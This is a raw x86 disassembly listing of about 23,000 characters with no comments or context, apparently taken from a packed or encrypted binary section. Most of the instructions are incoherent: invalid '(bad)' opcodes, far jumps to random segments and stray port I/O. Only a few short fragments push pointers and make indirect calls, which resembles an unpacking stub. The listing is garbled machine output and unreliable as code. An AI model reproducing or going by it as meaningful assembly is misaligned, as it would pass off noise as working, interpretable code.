  4040ba:	mov    WORD PTR [edi-0x64a66157],ds
  4040c0:	int    0x2f
  4040c2:	mov    DWORD PTR [edi],ebp
  4040c4:	dec    esp
  4040c5:	inc    eax
  4040c6:	cmp    dl,BYTE PTR [edx]
  4040c8:	xchg   ebp,eax
  4040c9:	or     dl,BYTE PTR [edi-0x30471656]
  4040cf:	mov    ebx,0x8a2e367
  4040d4:	pop    esp
  4040d5:	ret    
  4040d6:	ds aam 0xa1
  4040d9:	stos   BYTE PTR es:[edi],al
  4040da:	repz add al,0x81
  4040dd:	mov    ds:0x589a5d24,eax
  4040e2:	xor    eax,DWORD PTR [eax-0x25]
  4040e5:	cmc    
  4040e6:	add    bl,al
  4040e8:	cmp    DWORD PTR [edx+0x4c1007dc],edx
  4040ee:	call   0xf932:0x65534e0f
  4040f5:	hlt    
  4040f6:	jmp    0x404133
  4040f8:	mov    ds:0xfa962ca8,al
  4040fd:	scas   al,BYTE PTR es:[edi]
  4040fe:	fs mov edi,0x47cf2371
  404104:	push   0xfffffffe
  404106:	push   ebp
  404107:	and    dl,ah
  404109:	out    dx,al
  40410a:	push   edx
  40410b:	xchg   esp,eax
  40410c:	sahf   
  40410d:	adc    BYTE PTR [esi+0x4bab8cd1],0xaa
  404114:	popf   
  404115:	outs   dx,BYTE PTR ds:[esi]
  404116:	jmp    FWORD PTR [edi]
  404118:	push   ebp
  404119:	jmp    0x4040a2
  40411b:	das    
  40411c:	shl    DWORD PTR [ebx-0x66],1
  40411f:	cvtdq2ps xmm2,XMMWORD PTR [ebp+edi*4-0x6cd24726]
  404127:	inc    ebx
  404128:	dec    edx
  404129:	mov    esp,0xaf595df
  40412e:	mov    esi,0xd79213f6
  404133:	jbe    0x4041a1
  404135:	add    BYTE PTR [esi+0x18343733],dh
  40413b:	or     edi,ebp
  40413d:	mov    ecx,0xc65b545b
  404142:	push   es
  404143:	xchg   ebx,eax
  404144:	mov    ebx,0x93bb963e
  404149:	shl    BYTE PTR [edi+eiz*4+0x13966e77],0xc1
  404151:	mov    bh,0x51
  404153:	(bad)  
  404154:	mov    dl,0xc4
  404156:	push   0x6d
  404158:	subps  xmm7,XMMWORD PTR [eax]
  40415b:	mov    edx,0x2b30d690
  404160:	inc    ebp
  404161:	jecxz  0x4041d6
  404163:	push   ebx
  404164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404165:	cmp    BYTE PTR [ebp-0x60a6849f],dl
  40416b:	scas   al,BYTE PTR es:[edi]
  40416c:	mov    cl,0x26
  40416e:	mov    dh,0xe7
  404170:	or     al,0x6a
  404172:	call   0x9afe7268
  404177:	inc    esi
  404178:	or     eax,0x8c06b7fa
  40417d:	popf   
  40417e:	popa   
  40417f:	and    al,0xf3
  404181:	stos   BYTE PTR es:[edi],al
  404182:	mov    cl,0xee
  404184:	sub    al,0xfd
  404186:	or     ch,cl
  404188:	(bad)  
  404189:	retf   
  40418a:	lods   eax,DWORD PTR ds:[esi]
  40418b:	mov    DWORD PTR [edx-0x1c],esp
  40418e:	pop    eax
  40418f:	jp     0x404111
  404191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404192:	adc    bh,dh
  404194:	xchg   ecx,eax
  404195:	inc    esp
  404196:	mov    ebp,ebx
  404198:	push   ss
  404199:	add    BYTE PTR [ecx+0x14628d67],bh
  40419f:	xor    eax,0x8571c39a
  4041a4:	mov    esi,0xd3b7d042
  4041a9:	dec    esp
  4041aa:	out    0xef,eax
  4041ac:	cld    
  4041ad:	adc    al,BYTE PTR [ecx+0x1a]
  4041b0:	xlat   BYTE PTR ds:[ebx]
  4041b1:	rol    BYTE PTR [edx+ecx*2],1
  4041b4:	mov    ah,0x73
  4041b7:	repnz in al,dx
  4041b9:	das    
  4041ba:	adc    BYTE PTR [eax+0x4a5d9942],bh
  4041c0:	aas    
  4041c1:	sbb    ah,BYTE PTR [eax+0x7d]
  4041c4:	xor    bh,dh
  4041c6:	ret    0xad24
  4041c9:	cmp    al,0xbb
  4041cb:	xchg   edi,eax
  4041cc:	aas    
  4041cd:	adc    eax,0xed64ad45
  4041d2:	mov    al,ds:0x2e1d96cd
  4041d7:	je     0x404214
  4041d9:	in     eax,dx
  4041da:	mov    dh,BYTE PTR ds:0x1c4320d6
  4041e0:	(bad)  
  4041e1:	sub    ecx,DWORD PTR [ebp+0x1f27d640]
  4041e7:	lods   al,BYTE PTR ds:[esi]
  4041e8:	dec    edi
  4041e9:	leave  
  4041ea:	mov    edx,0x2fb7f2f6
  4041ef:	outs   dx,DWORD PTR ds:[esi]
  4041f0:	test   eax,0x2445c0d5
  4041f5:	(bad)
  4041f9:	pop    ss
  4041fa:	jmp    0x404227
  4041fc:	xchg   DWORD PTR [edi+edi*8],esi
  4041ff:	mov    esi,?
  404201:	or     bh,dl
  404203:	outs   dx,BYTE PTR ds:[esi]
  404204:	jmp    0x4041f4
  404206:	push   0xf33ad59b
  40420b:	pop    edx
  40420c:	call   0xafe:0xd18793e6
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si-0x66],0x39
  404248:	lock mov esp,0x7e7e25d5
  40424e:	outs   dx,DWORD PTR ds:[esi]
  40424f:	jge    0x4042cf
  404251:	jle    0x4041e2
  404253:	in     eax,0x48
  404255:	pop    edx
  404256:	sbb    cl,dh
  404258:	sets   BYTE PTR [ecx]
  40425b:	and    eax,0x3f0ffa32
  404260:	dec    ebp
  404261:	retf   
  404262:	cmc    
  404263:	scas   eax,DWORD PTR es:[edi]
  404264:	inc    esp
  404265:	(bad)  
  404266:	xchg   ecx,eax
  404267:	aaa    
  404268:	das    
  404269:	ror    BYTE PTR [ebp-0x60],1
  40426c:	push   es
  40426d:	mov    bh,cl
  40426f:	sbb    al,0x5b
  404271:	int    0x9c
  404273:	lds    ebp,FWORD PTR [eax-0x75391787]
  404279:	or     edi,DWORD PTR [esi]
  40427b:	dec    esp
  40427c:	add    edx,DWORD PTR [edi+0x46]
  40427f:	jne    0x40421a
  404281:	ins    BYTE PTR es:[edi],dx
  404282:	mov    dh,0xd9
  404284:	loope  0x4042ef
  404286:	js     0x4042ab
  404288:	mov    bl,0xa7
  40428a:	jecxz  0x4042a8
  40428c:	xchg   esi,eax
  40428d:	fimul  DWORD PTR [esi+0x53]
  404290:	adc    DWORD PTR [eax+0x210464eb],edi
  404296:	dec    esi
  404297:	mul    DWORD PTR [esi-0x53]
  40429a:	jle    0x404268
  40429c:	cmp    eax,DWORD PTR [ebx+ebx*4+0x39]
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	sub    eax,0x71e1d32d
  4042a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042a7:	mov    ds:0x1135e6a6,eax
  4042ac:	daa    
  4042ad:	dec    ecx
  4042ae:	pop    es
  4042af:	test   DWORD PTR [ebx+0x61],edi
  4042b2:	js     0x40427f
  4042b4:	xchg   edx,eax
  4042b5:	test   al,0xb9
  4042b7:	sub    ebp,edx
  4042b9:	jg     0x404317
  4042bb:	xlat   BYTE PTR ds:[ebx]
  4042bc:	or     al,0x24
  4042be:	addr16 (bad) 
  4042c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042c2:	fwait
  4042c3:	jnp    0x40424d
  4042c5:	icebp  
  4042c6:	repnz shr DWORD PTR [ecx-0x1c],cl
  4042ca:	or     eax,0x57370f28
  4042cf:	(bad)  
  4042d0:	scas   eax,DWORD PTR es:[edi]
  4042d1:	and    DWORD PTR [ecx],eax
  4042d3:	test   BYTE PTR [ebp+0x4a527b43],0x78
  4042da:	jnp    0x404279
  4042dc:	scas   eax,DWORD PTR es:[edi]
  4042dd:	push   ds
  4042de:	repz je 0x404308
  4042e1:	cmp    bl,ah
  4042e3:	cmp    eax,0x840ddf22
  4042e8:	jns    0x40433d
  4042ea:	inc    esp
  4042eb:	stc    
  4042ec:	inc    edx
  4042ed:	mov    bl,0xd0
  4042ef:	outs   dx,BYTE PTR ds:[esi]
  4042f0:	jo     0x4042b4
  4042f2:	es xchg esp,eax
  4042f4:	pop    ds
  4042f5:	xlat   BYTE PTR ds:[ebx]
  4042f6:	pop    edi
  4042f7:	dec    ebp
  4042f8:	jl     0x404366
  4042fa:	mov    esp,0xfb5469f3
  4042ff:	call   0x2636:0x3197fd5d
  404306:	xor    BYTE PTR ss:[ecx+ebp*1-0x7d8de7f4],ch
  40430e:	test   eax,0x53f08ee9
  404313:	pop    esp
  404314:	inc    eax
  404315:	inc    ebx
  404316:	outs   dx,DWORD PTR ds:[esi]
  404317:	loopne 0x404389
  404319:	lahf   
  40431a:	push   cs
  40431b:	push   ebp
  40431c:	retf   0xee79
  40431f:	shr    BYTE PTR [edx],cl
  404321:	mov    ds,eax
  404323:	fs xchg ebp,eax
  404325:	lods   eax,DWORD PTR ds:[esi]
  404326:	adc    dh,dl
  404328:	jmp    0x2742:0xb0bca117
  40432f:	scas   eax,DWORD PTR es:[edi]
  404330:	hlt    
  404331:	pop    ebp
  404332:	inc    eax
  404333:	xchg   ebx,eax
  404334:	out    dx,al
  404335:	lods   eax,DWORD PTR ds:[esi]
  404336:	jle    0x404367
  404338:	mov    ds:0x2f672c57,eax
  40433d:	xor    cl,0x25
  404340:	in     eax,dx
  404341:	std    
  404342:	and    esi,DWORD PTR [ecx]
  404344:	fild   DWORD PTR [esi]
  404346:	(bad)  
  404347:	iret   
  404348:	sub    eax,0xdc62abd2
  40434d:	sub    ebp,ecx
  40434f:	ret    
  404350:	ja     0x404395
  404352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404353:	hlt    
  404354:	jbe    0x40436f
  404356:	inc    ebx
  404357:	pushf  
  404358:	dec    ebp
  404359:	mov    bh,0x78
  40435b:	out    0x37,al
  40435d:	sbb    edx,edi
  40435f:	mov    ecx,0x908ff977
  404364:	jle    0x4043ad
  404366:	pop    ds
  404367:	mov    dl,0xc0
  404369:	inc    ebp
  40436a:	loop   0x4043b5
  40436c:	add    ah,BYTE PTR [edx]
  40436e:	popf   
  40436f:	loope  0x40433a
  404371:	jb     0x4043a4
  404373:	int    0xe7
  404375:	loopne 0x4043bc
  404377:	mov    ch,0x54
  404379:	les    esi,FWORD PTR [edx+0x4a]
  40437c:	sub    DWORD PTR cs:[ecx-0x5f0b96c8],esp
  404383:	psubd  mm6,QWORD PTR [ebx-0x69]
  404387:	push   edx
  404388:	push   ss
  404389:	inc    ebp
  40438a:	jge    0x4043c5
  40438c:	icebp  
  40438d:	pop    eax
  40438e:	ret    
  40438f:	popf   
  404390:	daa    
  404391:	fistp  DWORD PTR [ecx-0x50]
  404394:	and    eax,0xb63bbfaf
  404399:	ror    BYTE PTR [ebx+0x54],cl
  40439c:	fiadd  DWORD PTR [ebx-0x40708012]
  4043a2:	inc    ebx
  4043a3:	inc    edi
  4043a4:	popa   
  4043a5:	jbe    0x4043fe
  4043a7:	adc    DWORD PTR [ecx],esp
  4043a9:	xchg   edx,eax
  4043aa:	test   DWORD PTR [edi],0xb9bda729
  4043b0:	inc    eax
  4043b1:	push   eax
  4043b2:	push   esp
  4043b3:	lods   al,BYTE PTR ds:[esi]
  4043b4:	pop    ds
  4043b5:	int    0xfc
  4043b7:	call   0x7950:0x3f36b26b
  4043be:	fscale 
  4043c0:	sbb    DWORD PTR [ecx],esi
  4043c2:	sbb    DWORD PTR [eax-0x6fde9879],eax
  4043c8:	dec    esp
  4043c9:	push   cs
  4043ca:	fild   QWORD PTR [ecx+edi*8+0x4839b410]
  4043d1:	and    esp,DWORD PTR [ebp+0x5a]
  4043d4:	inc    edx
  4043d5:	jecxz  0x404362
  4043d7:	shl    BYTE PTR [ebp-0x3],0xb9
  4043db:	push   eax
  4043dc:	(bad)  
  4043dd:	jle    0x4043a2
  4043df:	rcl    dh,0xc
  4043e2:	pop    esp
  4043e3:	mov    ch,0xb2
  4043e5:	sbb    BYTE PTR [edi+0x39],al
  4043e8:	add    dl,BYTE PTR [esi+0x6a]
  4043eb:	shl    DWORD PTR [esi-0x6cfb3a5e],0x28
  4043f2:	xchg   DWORD PTR [edi-0x26],eax
  4043f5:	scas   eax,DWORD PTR es:[edi]
  4043f6:	add    dl,BYTE PTR [eax]
  4043f8:	cdq    
  4043f9:	adc    DWORD PTR [ebp-0x48a41ab6],ebp
  4043ff:	lds    esi,FWORD PTR [edx]
  404401:	ins    DWORD PTR es:[edi],dx
  404402:	cs jmp 0x637a3337
  404408:	pop    es
  404409:	clc    
  40440a:	into   
  40440b:	sbb    eax,0x239849d3
  404410:	sbb    al,0x28
  404412:	popa   
  404413:	sbb    al,0xff
  404415:	jl     0x40443d
  404417:	mov    ch,0xeb
  404419:	xor    edi,DWORD PTR [edi+0x57]
  40441c:	nop
  40441d:	mov    bl,0xa3
  40441f:	adc    al,0x3e
  404421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404422:	sub    eax,0x99edfe43
  404427:	inc    ebp
  404428:	mov    ah,0x35
  40442a:	push   0xffffffd4
  40442c:	scas   al,BYTE PTR es:[edi]
  40442d:	cld    
  40442e:	lea    esp,[ecx-0x65]
  404431:	inc    esi
  404432:	arpl   WORD PTR [ecx-0x1e1b10f5],ax
  404438:	repz jp 0x4043f7
  40443b:	mov    cl,0xde
  40443d:	dec    edx
  40443e:	pop    ecx
  40443f:	iret   
  404440:	int3   
  404441:	cmp    al,0xd3
  404443:	rol    BYTE PTR [edi],0x4a
  404446:	inc    ebx
  404447:	jge    0x404411
  404449:	adc    ch,0x42
  40444c:	outs   dx,DWORD PTR ds:[esi]
  40444d:	xchg   edx,eax
  40444e:	pop    edi
  40444f:	xor    ah,BYTE PTR [edx+0x64d78511]
  404455:	mov    bh,0xed
  404457:	inc    edx
  404458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404459:	pop    edi
  40445a:	cmp    edx,DWORD PTR [ecx]
  40445c:	mov    ch,0x58
  40445e:	push   cs
  40445f:	fs gs pop edx
  404462:	dec    esp
  404463:	dec    ebx
  404464:	stos   BYTE PTR es:[edi],al
  404465:	sbb    ch,BYTE PTR [ebx+0x14]
  404468:	cmc    
  404469:	push   ds
  40446a:	add    DWORD PTR [edi+0x3e],ebp
  40446d:	jecxz  0x4044ca
  40446f:	jmp    0xa9ca:0xe9b24e97
  404476:	cmc    
  404477:	test   al,0x52
  404479:	sub    al,0xc5
  40447b:	fwait
  40447c:	sar    DWORD PTR [esi+0x1c],0x8a
  404480:	mov    ds:0x68ba50cf,al
  404485:	jle    0x40441e
  404487:	(bad)  
  404488:	retf   0x1758
  40448b:	mov    cl,0xcc
  40448d:	mov    al,ds:0x2b0958c1
  404492:	daa    
  404493:	mov    ebx,0x190df4d3
  404498:	mov    ecx,0xd71d024e
  40449d:	fist   DWORD PTR [ebx]
  40449f:	test   BYTE PTR ds:0xe9dda14d,cl
  4044a5:	push   es
  4044a6:	enter  0x504a,0x3d
  4044aa:	cmp    dh,bl
  4044ac:	sar    BYTE PTR [ebx+eiz*2+0x5c481602],cl
  4044b3:	mov    ch,0x60
  4044b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044b6:	sar    edx,1
  4044b8:	fisttp DWORD PTR [esi+0xce65694]
  4044bf:	jmp    0xc68b:0x6c391c6d
  4044c6:	pop    esp
  4044c7:	popa   
  4044c8:	and    eax,0x1451ab2a
  4044cd:	imul   ebp,DWORD PTR [eax+0x322f001f],0x1d233fd5
  4044d7:	push   0xc8461b59
  4044dc:	cmp    eax,0xf6bd8b60
  4044e1:	push   eax
  4044e2:	inc    edi
  4044e3:	sbb    eax,0xed1a8683
  4044e8:	cmp    ah,BYTE PTR [ebp-0xa7a64fe]
  4044ee:	in     al,0x22
  4044f0:	dec    edi
  4044f1:	push   edi
  4044f2:	dec    ecx
  4044f3:	arpl   WORD PTR [edx+esi*4+0x41],di
  4044f7:	adc    al,0xb1
  4044f9:	dec    ebx
  4044fa:	cmp    BYTE PTR [edi-0x53],ch
  4044fd:	xchg   edx,eax
  4044fe:	fist   DWORD PTR [eax]
  404500:	lds    esi,FWORD PTR [edi+0x51]
  404503:	das    
  404504:	cmp    eax,0x8f39211a
  404509:	fldcw  WORD PTR [edi+0x3c]
  40450c:	sub    BYTE PTR es:[ebp+0x560bbbcf],bl
  404513:	rcl    esp,0x17
  404516:	pushf  
  404517:	mov    al,ds:0xeacc1342
  40451c:	test   al,0xf0
  40451e:	icebp  
  40451f:	or     BYTE PTR [ebp-0x30],bh
  404522:	and    al,dh
  404524:	(bad)
  404527:	mov    WORD PTR [edi+0x50],cs
  40452a:	xchg   esp,eax
  40452b:	pop    ds
  40452c:	pop    esp
  40452d:	push   esi
  40452e:	shl    bl,1
  404530:	mov    eax,ds:0x10b0a355
  404535:	les    esi,FWORD PTR [ebp-0x16d55826]
  40453b:	push   cs
  40453c:	ret    0x2e84
  40453f:	push   ebx
  404540:	mov    ds,WORD PTR [ebx+0x1d4b4b83]
  404546:	xor    DWORD PTR [esi],edi
  404548:	sbb    edi,DWORD PTR [ecx-0x60]
  40454b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40454c:	or     al,0xf5
  40454e:	sbb    bl,BYTE PTR fs:[eax]
  404551:	cwde   
  404552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404553:	scas   eax,DWORD PTR es:[edi]
  404554:	or     edx,DWORD PTR [edx+eax*8-0x16e0a0f2]
  40455b:	xchg   ebp,eax
  40455c:	dec    eax
  40455d:	sbb    al,BYTE PTR [ecx+0x6fbfa06e]
  404563:	fst    DWORD PTR [ebx+0x49]
  404566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404567:	ja     0x40454f
  404569:	add    al,0x4c
  40456b:	lahf   
  40456c:	retf   
  40456d:	inc    ecx
  40456e:	(bad)  
  404570:	sbb    eax,0x1a069d8
  404575:	inc    edi
  404577:	xchg   edi,eax
  404578:	mov    ds:0xf9c3d07a,eax
  40457d:	out    dx,al
  40457e:	daa    
  40457f:	and    eax,ebx
  404581:	aad    0xaa
  404583:	das    
  404584:	pop    edi
  404585:	push   esp
  404586:	div    DWORD PTR [ebx]
  404588:	fwait
  404589:	rcl    DWORD PTR [eax-0x36],cl
  40458c:	add    ch,bl
  40458e:	fcmovu st,st(7)
  404590:	pusha  
  404591:	and    ecx,edx
  404593:	jbe    0x404539
  404595:	sub    al,0x2a
  404597:	sbb    bh,BYTE PTR [ebx-0x4640e861]
  40459d:	jb     0x4045a0
  40459f:	inc    esi
  4045a0:	adc    al,0xd1
  4045a2:	loope  0x4045e3
  4045a4:	(bad)  
  4045a5:	aaa    
  4045a6:	arpl   si,di
  4045a8:	mov    dl,0x69
  4045aa:	pop    ebp
  4045ab:	and    eax,0xd1b9d2b9
  4045b0:	les    edx,FWORD PTR [ecx]
  4045b2:	in     eax,dx
  4045b3:	ss aaa 
  4045b5:	pop    ss
  4045b6:	cld    
  4045b7:	loope  0x4045ad
  4045b9:	pop    ebp
  4045ba:	adc    dh,BYTE PTR [eax]
  4045bc:	xchg   ebx,eax
  4045bd:	ficom  WORD PTR [edx+0x5]
  4045c0:	fsub   QWORD PTR [edx+0x1c]
  4045c3:	push   ebx
  4045c4:	rol    BYTE PTR [esi],1
  4045c6:	stos   DWORD PTR es:[edi],eax
  4045c7:	cmp    al,0x45
  4045c9:	jne    0x404556
  4045cb:	adc    al,0x48
  4045cd:	xchg   esp,eax
  4045ce:	jbe    0x4045fb
  4045d0:	in     eax,dx
  4045d1:	leave  
  4045d2:	sbb    ch,al
  4045d4:	mov    ecx,DWORD PTR [edi]
  4045d6:	ins    DWORD PTR es:[edi],dx
  4045d7:	test   BYTE PTR [edi+0xb],al
  4045da:	retf   0x27f2
  4045dd:	lahf   
  4045de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045df:	and    ebp,DWORD PTR [esi-0x3dd31361]
  4045e5:	fidiv  DWORD PTR [eax+eax*1]
  4045e8:	cdq    
  4045e9:	dec    ecx
  4045ea:	jp     0x40465c
  4045ec:	fsubr  DWORD PTR [ecx]
  4045ee:	and    DWORD PTR [eax+0x604e17de],edx
  4045f4:	sbb    ebp,DWORD PTR [ebx]
  4045f6:	mov    dh,0xcb
  4045f8:	(bad)  
  4045f9:	scas   eax,DWORD PTR es:[edi]
  4045fa:	fdiv   DWORD PTR [ebx]
  4045fc:	inc    esi
  4045fd:	jl     0x40465f
  4045ff:	or     al,0xe3
  404601:	xlat   BYTE PTR ds:[ebx]
  404602:	cwde   
  404603:	or     BYTE PTR [edi+esi*4+0x3a],dh
  404607:	test   al,0x76
  404609:	(bad)  
  40460b:	xchg   ecx,eax
  40460c:	(bad)  
  40460d:	sub    edx,DWORD PTR [edx]
  40460f:	out    0x65,eax
  404611:	inc    esi
  404612:	aad    0x45
  404614:	inc    ebx
  404615:	bound  edx,QWORD PTR [ebp+0x453e1e67]
  40461b:	loope  0x404629
  40461d:	cs scas al,BYTE PTR es:[edi]
  40461f:	pop    ebp
  404620:	xor    esp,esp
  404622:	push   ss
  404623:	pop    esi
  404624:	test   eax,0x8dcb190
  404629:	out    0x1f,eax
  40462b:	sbb    DWORD PTR [ecx+0x74b8717f],0x6e77eb7e
  404635:	popf   
  404636:	pushf  
  404637:	cmp    DWORD PTR [eax],ecx
  404639:	add    ah,BYTE PTR [esi+eax*4-0x6f]
  40463d:	xchg   ebx,eax
  40463e:	shl    DWORD PTR [eax+0x2a],cl
  404641:	scas   eax,DWORD PTR es:[edi]
  404642:	ret    0x30ff
  404645:	lea    eax,ds:0x413dc2
  40464b:	push   DWORD PTR [eax]
  40464d:	xchg   ebx,edx
  40464f:	inc    ebx
  404650:	inc    ebx
  404651:	push   ebx
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0x30c1f0e3
  404675:	mov    eax,ds:0x7e7e21c2
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	jge    0x4046fb
  40467d:	jle    0x404687
  40467f:	push   cs
  404680:	sub    BYTE PTR [ebx+0x1],bh
  404683:	mov    es,WORD PTR ds:0x379bd9ed
  404689:	sub    DWORD PTR [edi],eax
  40468b:	jns    0x40461f
  40468d:	ficom  DWORD PTR [edi]
  40468f:	scas   al,BYTE PTR es:[edi]
  404690:	test   al,0x7a
  404692:	mov    eax,0xfe786816
  404697:	test   eax,0x1714e88
  40469c:	adc    al,0x90
  40469e:	es retf 0xab2e
  4046a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046a3:	pop    ebp
  4046a4:	xor    al,0xa4
  4046a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046a7:	push   ss
  4046a8:	mov    ch,0x36
  4046aa:	iret   
  4046ab:	pop    esp
  4046ac:	pop    edx
  4046ad:	xlat   BYTE PTR ds:[ebx]
  4046ae:	push   ss
  4046af:	dec    esi
  4046b0:	sbb    edi,DWORD PTR [ecx-0xd6168e9]
  4046b6:	push   esi
  4046b7:	push   cs
  4046b8:	aaa    
  4046b9:	pop    ebp
  4046ba:	int3   
  4046bb:	cmp    al,0xd5
  4046bd:	sbb    BYTE PTR [ebx+0x11],ch
  4046c0:	cdq    
  4046c1:	jno    0x4046ca
  4046c3:	and    cl,dh
  4046c5:	dec    ebp
  4046c6:	jle    0x4046d8
  4046c8:	and    ebp,ebp
  4046ca:	ins    BYTE PTR es:[edi],dx
  4046cb:	mov    cl,0x8d
  4046cd:	loopne 0x4046d8
  4046cf:	aam    0x97
  4046d1:	mov    eax,ds:0x51993bac
  4046d6:	enter  0xd88f,0x39
  4046da:	mov    WORD PTR [eax-0x61],gs
  4046dd:	add    eax,0x3935cfa6
  4046e2:	dec    esp
  4046e3:	sbb    cl,BYTE PTR [ebp-0x1d]
  4046e6:	mov    BYTE PTR [ecx-0x76cb5477],dh
  4046ec:	sbb    ah,ah
  4046ee:	add    eax,DWORD PTR [ebx]
  4046f0:	mov    bl,0x77
  4046f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046f3:	nop
  4046f4:	in     al,dx
  4046f5:	shl    BYTE PTR [eax+ecx*4],1
  4046f8:	rcl    BYTE PTR [ecx-0x1328a321],0x1d
  4046ff:	pop    esi
  404700:	outs   dx,BYTE PTR ds:[esi]
  404701:	dec    ebp
  404702:	test   al,0xdb
  404704:	sub    al,BYTE PTR [edx+0x39]
  404707:	rcr    DWORD PTR [esi],cl
  404709:	adc    al,0xbf
  40470b:	hlt    
  40470c:	add    dl,BYTE PTR [ebx-0x2d]
  40470f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404710:	and    eax,DWORD PTR ds:0xcabd4316
  404716:	repnz and ah,ah
  404719:	pop    ebx
  40471a:	sub    esp,edx
  40471c:	iret   
  40471d:	test   dh,al
  40471f:	sub    al,0x8c
  404721:	call   0x37cc:0x8c52eb44
  404728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404729:	ficom  DWORD PTR [eax]
  40472b:	pop    eax
  40472c:	lahf   
  40472d:	sub    ebp,esi
  40472f:	fmul   DWORD PTR [ebx-0x75]
  404732:	push   ecx
  404733:	fwait
  404734:	xchg   ecx,eax
  404735:	ins    DWORD PTR es:[edi],dx
  404736:	daa    
  404737:	cmp    dh,ch
  404739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40473a:	call   0xe673:0xcf9cc8c4
  404741:	xlat   BYTE PTR ds:[ebx]
  404742:	pop    ds
  404743:	sbb    al,0xa6
  404745:	enter  0x2897,0x17
  404749:	jmp    DWORD PTR [esi]
  40474b:	xor    esp,DWORD PTR [edx]
  40474d:	ret    0x410
  404750:	push   ds
  404751:	sub    eax,esi
  404753:	out    dx,al
  404754:	mov    dh,0xe5
  404756:	xchg   edx,eax
  404757:	test   esi,0xf7420246
  40475d:	repz mov cl,0x31
  404760:	jb     0x404706
  404762:	jmp    0x9e49:0xf06453ec
  404769:	jne    0x4047e1
  40476b:	hlt    
  40476c:	(bad)  
  40476d:	in     al,dx
  40476e:	cmc    
  40476f:	adc    al,BYTE PTR [eax-0x6a]
  404772:	mov    ebx,0xb7dffc77
  404777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404778:	cld    
  404779:	pop    eax
  40477a:	xchg   ebx,eax
  40477b:	cmp    al,0x5c
  40477d:	lods   eax,DWORD PTR ds:[esi]
  40477e:	sub    DWORD PTR [ebx-0x9],0x125257ce
  404785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404786:	mov    cl,0x78
  404788:	cmp    DWORD PTR [edi+edx*4-0x4a6426b4],edi
  40478f:	sbb    dh,BYTE PTR [edx-0x3b4ad159]
  404795:	cdq    
  404796:	inc    ebx
  404797:	hlt    
  404798:	adc    BYTE PTR [eax+0x11],ch
  40479b:	mov    es,WORD PTR [ecx+ecx*4+0x3b]
  40479f:	clc    
  4047a0:	ins    BYTE PTR es:[edi],dx
  4047a1:	adc    eax,0x3601c5ea
  4047a6:	jg     0x4047f2
  4047a8:	jmp    0x7943:0x1fcd7ac6
  4047af:	test   al,0x8b
  4047b1:	push   ebx
  4047b2:	pop    esi
  4047b3:	rcl    DWORD PTR [ecx+0x4c],cl
  4047b6:	or     DWORD PTR [ecx-0x44605d01],0x7b
  4047bd:	xor    esi,DWORD PTR [ecx]
  4047bf:	jns    0x404775
  4047c1:	loope  0x4047c8
  4047c3:	push   ebx
  4047c4:	dec    ecx
  4047c5:	adc    DWORD PTR [eax+0x5e],ebp
  4047c8:	jle    0x404808
  4047ca:	pop    edx
  4047cb:	cs sub ebp,ecx
  4047ce:	adc    DWORD PTR [edi+0x1f3aaf71],ebp
  4047d4:	into   
  4047d5:	shl    BYTE PTR [edx],1
  4047d7:	xor    bh,BYTE PTR [edi-0x1892d440]
  4047dd:	scas   al,BYTE PTR es:[edi]
  4047de:	icebp  
  4047df:	pop    ss
  4047e0:	jmp    0x4047a8
  4047e2:	lods   eax,DWORD PTR ds:[esi]
  4047e3:	and    ebp,eax
  4047e5:	(bad)  
  4047e6:	loop   0x40476c
  4047e8:	xchg   esp,eax
  4047e9:	ss cld 
  4047eb:	and    esp,ebx
  4047ed:	sbb    ecx,DWORD PTR [ebx-0x29]
  4047f0:	adc    bl,BYTE PTR [edi-0x7a]
  4047f3:	xchg   ebp,eax
  4047f4:	jp     0x4047b6
  4047f6:	pop    eax
  4047f7:	add    eax,0x22c2d25e
  4047fc:	jmp    0x4047cf
  4047fe:	mov    ebx,0xb904a825
  404803:	sbb    BYTE PTR [ecx-0x3b],dl
  404806:	add    edx,DWORD PTR [ebp+0x2d]
  404809:	push   ebx
  40480a:	sub    al,0x11
  40480c:	cmp    DWORD PTR [edx-0x22dd2a69],ecx
  404812:	addr16 inc ebp
  404814:	sahf   
  404815:	adc    DWORD PTR [edx-0x1a],esi
  404818:	push   ecx
  404819:	bound  ebx,QWORD PTR [ebx]
